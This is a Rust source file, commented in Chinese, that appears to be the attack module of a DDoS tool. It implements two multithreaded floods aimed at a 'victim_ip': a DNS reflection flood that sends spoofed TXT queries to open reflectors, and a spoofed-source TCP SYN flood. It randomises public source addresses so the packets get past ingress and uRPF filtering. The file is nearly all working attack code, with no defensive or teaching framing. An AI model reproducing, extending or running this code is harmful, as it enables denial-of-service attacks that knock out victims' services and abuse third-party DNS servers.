// 反射攻击循环：伪源 DNS 查询洪泛。
// 每任务 N 线程；统计原子计数；节流由 throttle 模块提供。

use crate::dns;
use crate::reflector::Reflector;
use crate::spoof::SpoofSocket;
use crate::throttle::Throttle;
use std::sync::atomic::Ordering;
use std::sync::Arc;
use std::time::{Duration, Instant};

// MIPS32 等 32 位平台没有 64 位原子原语：按平台选择原子类型
#[cfg(target_has_atomic = "64")]
use std::sync::atomic::AtomicU64 as AtomicCount;
#[cfg(not(target_has_atomic = "64"))]
use std::sync::atomic::AtomicU32 as AtomicCount;

#[derive(Default)]
pub struct Stats {
    packets: AtomicCount,
    bytes: AtomicCount,
    errors: AtomicCount,
    pps: AtomicCount,
    /// 当前 1 秒窗口内所有线程累计的包数（由 flush_pps 归集）
    pps_window: AtomicCount,
}

impl Stats {
    #[cfg(target_has_atomic = "64")]
    pub fn add(&self, packets: u64, bytes: u64, errors: u64) {
        self.packets.fetch_add(packets, Ordering::Relaxed);
        self.bytes.fetch_add(bytes, Ordering::Relaxed);
        self.errors.fetch_add(errors, Ordering::Relaxed);
    }
    #[cfg(not(target_has_atomic = "64"))]
    pub fn add(&self, packets: u64, bytes: u64, errors: u64) {
        self.packets.fetch_add(packets as u32, Ordering::Relaxed);
        self.bytes.fetch_add(bytes as u32, Ordering::Relaxed);
        self.errors.fetch_add(errors as u32, Ordering::Relaxed);
    }
    /// 记录本线程在最近 1 秒窗口内产生的包数。
    /// 多线程必须累加到同一窗口，否则上报的 PPS 只是单个线程的速率。
    #[cfg(target_has_atomic = "64")]
    pub fn add_pps(&self, delta: u64) {
        self.pps_window.fetch_add(delta, Ordering::Relaxed);
    }
    #[cfg(not(target_has_atomic = "64"))]
    pub fn add_pps(&self, delta: u64) {
        self.pps_window.fetch_add(delta as u32, Ordering::Relaxed);
    }
    /// 由 0 号线程在窗口结束时调用：把累计窗口值发布为全局 PPS 并清零窗口。
    #[cfg(target_has_atomic = "64")]
    pub fn flush_pps(&self) {
        let v = self.pps_window.swap(0, Ordering::Relaxed);
        self.pps.store(v, Ordering::Relaxed);
    }
    #[cfg(not(target_has_atomic = "64"))]
    pub fn flush_pps(&self) {
        let v = self.pps_window.swap(0, Ordering::Relaxed);
        self.pps.store(v, Ordering::Relaxed);
    }
    pub fn packets(&self) -> u64 {
        self.packets.load(Ordering::Relaxed) as u64
    }
    pub fn bytes(&self) -> u64 {
        self.bytes.load(Ordering::Relaxed) as u64
    }
    pub fn errors(&self) -> u64 {
        self.errors.load(Ordering::Relaxed) as u64
    }
    pub fn pps(&self) -> u64 {
        self.pps.load(Ordering::Relaxed) as u64
    }
}

/// 每线程的 PPS 配额：max_pps=0 表示不限速（Throttle 的约定），
/// 因此非 0 时必须保证每线程至少 1，否则整除为 0 会被当成"不限速"，
/// 限速配置（如 max_pps=10, threads=32）反而变成全速。
fn per_thread_pps(max_pps: u64, threads: u32) -> u64 {
    if max_pps == 0 {
        return 0;
    }
    let n = u64::from(threads.max(1));
    (max_pps / n).max(1)
}

pub struct TaskSpec {
    pub task_id: String,
    pub victim_ip: [u8; 4],
    /// 目标端口：dns_reflector 用不到（打反射器），tcp_syn 用目标端口
    pub victim_port: u16,
    pub duration_secs: u64,
    pub threads: u32,
    pub reflectors: Vec<Reflector>,
    pub max_pps: u64,
}

/// 运行一次伪源 TCP SYN 洪水（阻塞直到结束）。
/// 每线程一个 raw socket：随机伪源 IP + 随机源端口 + 随机序列号，
/// 目标回 SYN-ACK 到不存在的源地址（重传消耗其资源），半开连接堆积在目标队列。
pub fn run_tcp_syn(spec: &TaskSpec, stats: Arc<Stats>) {
    let dur = Duration::from_secs(spec.duration_secs);
    let mut handles = Vec::new();

    for t in 0..spec.threads {
        let victim = spec.victim_ip;
        let victim_port = spec.victim_port;
        let stats = Arc::clone(&stats);
        let mut thr = Throttle::new(per_thread_pps(spec.max_pps, spec.threads));
        let dur = dur;
        handles.push(std::thread::spawn(move || {
            let mut rng_state = (t as u64).wrapping_mul(0x9E3779B97F4A7C15) + 1;
            let sock = match SpoofSocket::new() {
                Ok(s) => s,
                Err(_) => return,
            };
            let end = Instant::now() + dur;
            let mut local_pkt = 0u64;
            let mut last_tick = Instant::now();
            let mut last_pkt = 0u64;

            while Instant::now() < end {
                if !thr.allow() {
                    std::thread::sleep(Duration::from_micros(100));
                    continue;
                }
                // xorshift：伪源 IP / 源端口 / 序列号 / IP ID 全部随机
                rng_state ^= rng_state << 13;
                rng_state ^= rng_state >> 7;
                rng_state ^= rng_state << 17;

                let src_ip = random_public_ip(&mut rng_state);
                let src_port = (rng_state & 0xFFFF) as u16;
                let seq = (rng_state >> 16) as u32;
                let ip_id = (rng_state >> 8) as u16;

                match sock.send_tcp_syn(src_ip, victim, victim_port, src_port, seq, ip_id) {
                    Ok(_) => {
                        stats.add(1, 40, 0); // IP 20B + TCP 20B
                        local_pkt += 1;
                    }
                    Err(_) => {
                        stats.add(0, 0, 1);
                    }
                }

                if last_tick.elapsed() >= Duration::from_secs(1) {
                    let delta = local_pkt - last_pkt;
                    // 所有线程累加进同一窗口，仅 0 号线程归集发布，
                    // 否则上报的 PPS 只是单线程速率（多线程被低估 N 倍）。
                    stats.add_pps(delta);
                    if t == 0 {
                        stats.flush_pps();
                    }
                    last_pkt = local_pkt;
                    last_tick = Instant::now();
                }
            }
        }));
    }
    for h in handles {
        let _ = h.join();
    }
}

/// 生成随机公网源 IP（排除保留/私有段，避免被 uRPF/入网过滤直接丢弃）
fn random_public_ip(state: &mut u64) -> [u8; 4] {
    loop {
        *state ^= *state << 13;
        *state ^= *state >> 7;
        *state ^= *state << 17;
        let b0 = (1 + (*state % 223)) as u8; // 1..=223（跳过 0/224+）
        let b1 = ((*state >> 8) & 0xFF) as u8;
        let b2 = ((*state >> 16) & 0xFF) as u8;
        let b3 = (1 + ((*state >> 24) & 0xFE)) as u8; // 避开 .0/.255
        // 排除私有段与保留段
        let private = (b0 == 10)
            || (b0 == 172 && (16..=31).contains(&b1))
            || (b0 == 192 && b1 == 168)
            || (b0 == 127)
            || (b0 == 169 && b1 == 254)
            || (b0 == 100 && (64..=127).contains(&b1));
        if !private {
            return [b0, b1, b2, b3];
        }
    }
}

/// 运行一次 DNS 反射攻击（阻塞直到结束）。
/// 统计经 Arc 共享（线程写入）。
pub fn run_dns_reflection(spec: &TaskSpec, stats: Arc<Stats>) {
    let dur = Duration::from_secs(spec.duration_secs);
    let mut handles = Vec::new();

    for t in 0..spec.threads {
        let victim = spec.victim_ip;
        let reflectors = spec.reflectors.clone();
        let stats = Arc::clone(&stats);
        let mut thr = Throttle::new(per_thread_pps(spec.max_pps, spec.threads));
        let dur = dur;
        handles.push(std::thread::spawn(move || {
            let mut rng_state = (t as u64).wrapping_mul(0x9E3779B97F4A7C15) + 1;
            let sock = match SpoofSocket::new() {
                Ok(s) => s,
                Err(_) => return,
            };
            let end = Instant::now() + dur;
            let mut local_pkt = 0u64;
            let mut last_tick = Instant::now();
            let mut last_pkt = 0u64;

            while Instant::now() < end {
                if !thr.allow() {
                    std::thread::sleep(Duration::from_micros(100));
                    continue;
                }
                // 随机选反射器 + 随机 DNS id
                rng_state ^= rng_state << 13;
                rng_state ^= rng_state >> 7;
                rng_state ^= rng_state << 17;
                let idx = (rng_state % reflectors.len() as u64) as usize;
                let refr = &reflectors[idx];
                let domain = if refr.domain.is_empty() { "isc.org" } else { &refr.domain };
                let q = dns::build_txt_query(domain, (rng_state & 0xFFFF) as u16);

                match sock.send_udp(victim, refr.ip, refr.port, &q) {
                    Ok(_) => {
                        stats.add(1, q.len() as u64, 0);
                        local_pkt += 1;
                    }
                    Err(_) => {
                        stats.add(0, 0, 1);
                    }
                }

                // 每秒统计 PPS
                if last_tick.elapsed() >= Duration::from_secs(1) {
                    let delta = local_pkt - last_pkt;
                    stats.add_pps(delta);
                    if t == 0 {
                        stats.flush_pps();
                    }
                    last_pkt = local_pkt;
                    last_tick = Instant::now();
                }
            }
        }));
    }
    for h in handles {
        let _ = h.join();
    }
}
